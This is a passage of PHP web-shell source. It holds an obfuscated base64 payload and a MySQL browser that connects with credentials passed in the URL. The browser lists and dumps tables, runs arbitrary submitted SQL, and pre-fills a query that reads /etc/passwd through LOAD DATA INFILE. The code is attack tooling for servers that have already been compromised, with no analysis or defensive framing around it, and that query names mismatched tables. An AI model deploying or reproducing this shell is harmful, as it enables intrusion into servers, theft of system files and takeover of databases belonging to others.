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'))); ?></textarea> 
</td>
</tr>
<tr>
<td>
						<input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="submitcmd" />
              				</td>
				</tr>
			</table>
			</form>
			<?php 
         		}
		elseif(isset($_GET['x']) && ($_GET['x'] == 'mysql'))
         		{ 
         			if(isset($_GET['sqlhost']) && isset($_GET['sqluser']) && isset($_GET['sqlpass']) && isset($_GET['sqlport']))
              				{ 
              				$sqlhost = $_GET['sqlhost']; $sqluser = $_GET['sqluser']; $sqlpass = $_GET['sqlpass']; $sqlport = $_GET['sqlport'];    
              				if($con = @mysql_connect($sqlhost.":".$sqlport,$sqluser,$sqlpass))
                   				{ 
                   				$msg .= "<div style=\"width:99%;padding:4px 10px 0 10px;\">"; 
                   				$msg .= "<p>Connected to ".$sqluser."<span class=\"gaya\">@</span>".$sqlhost.":".$sqlport; 
                   				$msg .= "&nbsp;&nbsp;<span class=\"gaya\">-&gt;</span>&nbsp;&nbsp;<a href=\"?y=".$pwd."&amp;x=mysql&amp;
                   				sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;
                   				sqlpass=".$sqlpass."&amp;
                   				sqlport=".$sqlport."&amp;\">[ databases ]</a>"; 
              					if(isset($_GET['db'])) 
                   					$msg .= "&nbsp;&nbsp;<span class=\"gaya\">-&gt;</span>&nbsp;&nbsp;
                   					<a href=\"y=".$pwd."&amp;x=mysql&amp;
                   					sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;
                   					sqlpass=".$sqlpass."&amp;
                   					sqlport=".$sqlport."&amp;
                   					db=".$_GET['db']."\">".htmlspecialchars($_GET['db'])."</a>"; 
              					if(isset($_GET['table'])) 
                   					$msg .= "&nbsp;&nbsp;<span class=\"gaya\">-&gt;
                   					</span>&nbsp;&nbsp;
                   					<a href=\"y=".$pwd."&amp;x=mysql&amp;
                   					sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;
                   					sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;
                   					db=".$_GET['db']."&amp;
                   					table=".$_GET['table']."\">".htmlspecialchars($_GET['table'])."</a>"; 
                   					$msg .= "</p><p>version : ".mysql_get_server_info($con)." proto ".mysql_get_proto_info($con)."</p>"; 
                   					$msg .= "</div>"; 
                   					echo $msg; 
              					if(isset($_GET['db']) && (!isset($_GET['table'])) && (!isset($_GET['sqlquery'])))
							{ 
							$db = $_GET['db']; 
                   					$query = "DROP TABLE IF EXISTS Newbie3viLc063s0_table;
                   					\nCREATE TABLE `Newbie3viLc063s0_table` ( `file` LONGBLOB NOT NULL );
                   					\nLOAD DATA INFILE \"/etc/passwd\"\nINTO TABLE Z3r0Z3r0_table;SELECT * FROM Newbie3viLc063s0_table;
                   					\nDROP TABLE IF EXISTS Newbie3viLc063s0_table;"; 
                   					$msg = "<div style=\"width:99%;padding:0 10px;\">
									<form action=\"?\" method=\"get\"> 
										<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" /> 
										<input type=\"hidden\" name=\"x\" value=\"mysql\" /> 
										<input type=\"hidden\" name=\"sqlhost\" value=\"".$sqlhost."\" /> 
										<input type=\"hidden\" name=\"sqluser\" value=\"".$sqluser."\" /> 
										<input type=\"hidden\" name=\"sqlport\" value=\"".$sqlport."\" /> 
										<input type=\"hidden\" name=\"sqlpass\" value=\"".$sqlpass."\" /> 
										<input type=\"hidden\" name=\"db\" value=\"".$db."\" /> 
										<p><textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\">$query</textarea></p> 
										<p><input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go\" /></p> 
									</form>
								</div> "; 
                           				$tables = array(); 
                           				$msg .= "<table class=\"explore\" style=\"width:99%;\"><tr><th>available tables on ".$db."</th></tr>"; 
                           				$hasil = @mysql_list_tables($db,$con); 
							while(list($table) = @mysql_fetch_row($hasil))
								{ @array_push($tables,$table); } 
							@sort($tables); 
							foreach($tables as $table)
								{ 
								$msg .= "<tr><td><a href=\"?y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;db=".$db."&amp;table=".$table."\">$table</a></td></tr>"; 
								} 
							$msg .= "</table>"; 
							} 
						elseif(isset($_GET['table']) && (!isset($_GET['sqlquery'])))
							{ 
							$db = $_GET['db']; 
							$table = $_GET['table']; 
							$query = "SELECT * FROM ".$db.".".$table." LIMIT 0,100;"; 
							$msgq = "<div style=\"width:99%;padding:0 10px;\">
									<form action=\"?\" method=\"get\"> 
										<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" /> 
										<input type=\"hidden\" name=\"x\" value=\"mysql\" /> 
										<input type=\"hidden\" name=\"sqlhost\" value=\"".$sqlhost."\" /> 
										<input type=\"hidden\" name=\"sqluser\" value=\"".$sqluser."\" /> 
										<input type=\"hidden\" name=\"sqlport\" value=\"".$sqlport."\" /> 
										<input type=\"hidden\" name=\"sqlpass\" value=\"".$sqlpass."\" /> 
										<input type=\"hidden\" name=\"db\" value=\"".$db."\" /> 
										<input type=\"hidden\" name=\"table\" value=\"".$table."\" /> 
										<p><textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\">".$query."</textarea></p> 
										<p><input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go\" /></p> 
									</form>
								</div> "; 
							$columns = array(); 
							$msg = "<table class=\"explore\" style=\"width:99%;\">"; 
							$hasil = @mysql_query("SHOW FIELDS FROM ".$db.".".$table); 
							while(list($column) = @mysql_fetch_row($hasil))
								{ 
								$msg .= "<th>$column</th>"; $kolum = $column; 
								} 
							$msg .= "</tr>"; 
							$hasil = @mysql_query("SELECT count(*) FROM ".$db.".".$table); 
							list($total) = mysql_fetch_row($hasil); 
							if(isset($_GET['z'])) $page = (int) $_GET['z']; 
							else $page = 1; 
							$pagenum = 100; 
							$totpage = ceil($total / $pagenum); 
							$start = (($page - 1) * $pagenum); 
							$hasil = @mysql_query("SELECT * FROM ".$db.".".$table." LIMIT ".$start.",".$pagenum); 
							while($datas = @mysql_fetch_assoc($hasil))
								{ 
								$msg .= "<tr>"; 
								foreach($datas as $data){ if(trim($data) == "") $data = "&nbsp;"; $msg .= "<td>$data</td>"; } 
								$msg .= "</tr>"; 
								} 
							$msg .= "</table>"; 
							$head = "<div style=\"padding:10px 0 0 6px;\"> 
									<form action=\"?\" method=\"get\"> 
										<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" /> 
										<input type=\"hidden\" name=\"x\" value=\"mysql\" /> 
										<input type=\"hidden\" name=\"sqlhost\" value=\"".$sqlhost."\" /> 
										<input type=\"hidden\" name=\"sqluser\" value=\"".$sqluser."\" /> 
										<input type=\"hidden\" name=\"sqlport\" value=\"".$sqlport."\" /> 
										<input type=\"hidden\" name=\"sqlpass\" value=\"".$sqlpass."\" /> 
										<input type=\"hidden\" name=\"db\" value=\"".$db."\" /> 
										<input type=\"hidden\" name=\"table\" value=\"".$table."\" /> 
										Page <select class=\"inputz\" name=\"z\" onchange=\"this.form.submit();\">"; 
							for($i = 1;$i <= $totpage;$i++)
								{ 
								$head .= "<option value=\"".$i."\">".$i."</option>"; 
								if($i == $_GET['z']) $head .= "<option value=\"".$i."\" selected=\"selected\">".$i."</option>"; 
								} 
							$head .= "</select><noscript><input class=\"inputzbut\" type=\"submit\" value=\"Go !\" /></noscript></form></div>"; 
							$msg = $msgq.$head.$msg; 
						} 
					elseif(isset($_GET['submitquery']) && ($_GET['sqlquery'] != ""))
						{ 
						$db = $_GET['db']; 
						$query = magicboom($_GET['sqlquery']); 
						$msg = "<div style=\"width:99%;padding:0 10px;\">
								<form action=\"?\" method=\"get\"> 
									<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" /> 
									<input type=\"hidden\" name=\"x\" value=\"mysql\" /> 
									<input type=\"hidden\" name=\"sqlhost\" value=\"".$sqlhost."\" /> 
									<input type=\"hidden\" name=\"sqluser\" value=\"".$sqluser."\" /> 
									<input type=\"hidden\" name=\"sqlport\" value=\"".$sqlport."\" /> 
									<input type=\"hidden\" name=\"sqlpass\" value=\"".$sqlpass."\" /> 
									<input type=\"hidden\" name=\"db\" value=\"".$db."\" /> 
									<p><textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\">".$query."</textarea></p> 
									<p><input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go\" /></p> 
								</form>
							</div> "; 
						@mysql_select_db($db); 
						$querys = explode(";",$query); 
						foreach($querys as $query)
							{ 
							if(trim($query) != "")
								{ 
								$hasil = mysql_query($query); 
								if($hasil)
									{ 
									$msg .= "<p style=\"padding:0;margin:20px 6px 0 6px;\">".$query.";&nbsp;&nbsp;&nbsp;
										<span class=\"gaya\">[</span> ok <span class=\"gaya\">]</span></p>"; 
									$msg .= "<table class=\"explore\" style=\"width:99%;\"><tr>"; 
									for($i=0;$i<@mysql_num_fields($hasil);$i++) $msg .= "<th>".htmlspecialchars(@mysql_field_name($hasil,$i))."</th>"; 
									$msg .= "</tr>"; 
									for($i=0;$i<@mysql_num_rows($hasil);$i++) 
										{ 
										$rows=@mysql_fetch_array($hasil); 
										$msg .= "<tr>"; 
										for($j=0;$j<@mysql_num_fields($hasil);$j++) 
											{ 
